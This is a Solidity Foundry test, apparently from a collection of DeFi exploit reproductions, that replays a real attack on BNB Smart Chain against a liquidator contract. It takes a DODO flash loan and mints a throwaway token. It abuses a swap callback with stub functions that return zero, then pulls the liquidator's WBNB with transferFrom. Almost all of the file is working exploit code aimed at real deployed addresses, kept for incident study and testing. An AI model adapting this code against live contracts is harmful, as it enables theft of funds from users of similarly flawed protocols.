// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1593690338526273536
// @TX
// https://bscscan.com/tx/0x3757d177482171dcfad7066c5e88d6f0f0fe74b28f32e41dd77137cad859c777

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Factory Factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address Token;
    uint256 WBNBAmount;
    address Pair;
    address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant Liquidator = 0xe65E970F065643bA80E5822edfF483A1d75263E3;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_165_446);
    }

    function testExploit() public {
        MyERC20 MyToken = new MyERC20();
        Token = address(MyToken);
        MyToken.mint(10 * 1e18);
        DVM(dodo).flashLoan(8 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        IERC20(Token).approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(Token), address(WBNB), 8 * 1e18, 8 * 1e18, 0, 0, address(this), block.timestamp + 60
        );
        Pair = Factory.getPair(Token, address(WBNB));
        WBNBAmount = WBNB.balanceOf(Liquidator);
        bytes memory data1 = abi.encode(address(this), address(this), address(this));
        if (Uni_Pair_V2(Pair).token0() == address(WBNB)) {
            Uni_Pair_V2(Pair).swap(WBNBAmount, 0, Liquidator, data1);
        } else {
            Uni_Pair_V2(Pair).swap(0, WBNBAmount, Liquidator, data1);
        }
        Uni_Pair_V2(Pair).approve(address(Router), type(uint256).max);
        Router.removeLiquidity(
            address(Token),
            address(WBNB),
            Uni_Pair_V2(Pair).balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 60
        );
        WBNB.transferFrom(Liquidator, address(this), WBNB.balanceOf(Liquidator));
        WBNB.transfer(dodo, 8 * 1e18);
    }

    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address cTokenCollateral
    ) external returns (uint256) {
        return 0;
    }

    function balanceOf(address account) external returns (uint256) {
        return 0;
    }

    function redeem(uint256 redeemTokens) external returns (uint256) {
        return 0;
    }
}

contract MyERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Shit Coin";
    string public symbol = "Shit";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
